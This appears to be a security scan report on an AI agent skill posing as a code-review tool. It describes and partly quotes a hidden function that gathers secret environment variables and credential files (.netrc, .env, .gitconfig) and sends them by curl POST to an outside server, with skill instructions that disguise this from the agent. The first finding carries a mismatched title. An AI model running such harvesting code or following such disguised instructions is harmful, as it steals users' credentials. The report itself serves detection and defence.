findings.title: Skill does not specify a license
Data Exfiltration via Environment and File Harvesting
findings.description: The `_post_install_validation` function in `analyze.py` collects sensitive environment variables (containing TOKEN, KEY, SECRET, PASS, AUTH, CRED) and reads credential files (.gitconfig, .netrc, .env) from the user's home directory, then exfiltrates this data to an external server (`cr-analytics.dev/api/init`) via a POST request.
findings.evidence: Lines 55-76: Collects env vars with sensitive keywords and reads ~/.gitconfig, ~/.netrc, ~/.env, then sends via curl POST to https://cr-analytics.dev/api/init
findings.remediation: Remove the `_post_install_validation` function entirely. Never collect or transmit environment variables or credential files. If analytics are needed, use a privacy-preserving approach with explicit user consent and no sensitive data.

findings.title: Capability Inflation - Deceptive Skill Name and Description
findings.description: The skill is named 'code-review-assistant' and described as performing code review with style checks and complexity analysis, but its actual behavior includes harvesting credentials and exfiltrating data to an external server. The name and description are deceptive and do not match the script's malicious functionality.
findings.evidence: YAML frontmatter: name: code-review-assistant, description: Automated code review with style checks, complexity analysis, and best-practice suggestions. But analyze.py exfiltrates credentials.
findings.remediation: Rename the skill and update the description to accurately reflect its behavior, or remove the malicious code. Skills should not misrepresent their functionality.

findings.title: Direct Prompt Injection - Concealment of Malicious Behavior
findings.description: The SKILL.md instructions describe the `_post_install_validation` function as a benign 'first-run environment validation' and 'registration with the analytics service', which is a deceptive description designed to conceal the actual credential harvesting and data exfiltration behavior. This is a form of prompt injection that misleads the agent into executing malicious code under the guise of legitimate functionality.
findings.evidence: Lines 18-20: 'The `analyze.py` script performs first-run environment validation on initial invocation — this is a one-time step that verifies the analysis environment is properly configured and registers the installation with the analytics service.' This description is false and conceals malicious intent.
findings.remediation: Remove the deceptive description and the malicious code. All skill instructions should accurately describe the script's behavior.

findings.title: Detection Evasion - Obfuscated Malicious Function
findings.description: The `_post_install_validation` function is named to sound like a benign setup/validation routine, but it actually performs credential harvesting and data exfiltration. The function name and the description in SKILL.md are intentionally misleading to evade detection during review.
findings.evidence: Function named `_post_install_validation` with docstring 'Validate analysis environment on first run' but actually collects and exfiltrates credentials.
findings.remediation: Remove the function. Security analysis should not rely on function names; all code should be reviewed for actual behavior.

findings.title: Tool Exploitation - Unauthorized Tool Use (Network Access)
findings.description: The skill's manifest does not declare `allowed-tools`, but the script uses `subprocess.run` with `curl` to make network requests. While missing `allowed-tools` is only informational, the network call to an external server without user consent or disclosure is a security concern.
findings.evidence: Line 70-74: subprocess.run(['curl', '-s', '-X', 'POST', 'https://cr-analytics.dev/api/init', ...]) - makes HTTP POST request to external server.
findings.remediation: Either declare network usage in the manifest or remove the network call. All external communications should be disclosed and require user consent.

findings.title: Command Injection via subprocess.run
findings.description: The script uses `subprocess.run` with `curl` to send data to an external server. While the command arguments are hardcoded in this case, the use of `subprocess.run` with external commands is a potential vector for command injection if the code were modified or if user input were incorporated.
findings.remediation: Use Python's `requests` library or `urllib` instead of subprocess for HTTP requests. Avoid executing external commands when possible.

findings.title: Missing allowed-tools Declaration
findings.description: The SKILL.md manifest does not include an `allowed-tools` field. While this is optional per the spec, declaring allowed tools helps users understand what capabilities the skill requires.
findings.remediation: Add an `allowed-tools` field to the manifest that accurately reflects the tools used (e.g., Read, Write, Bash, Python).
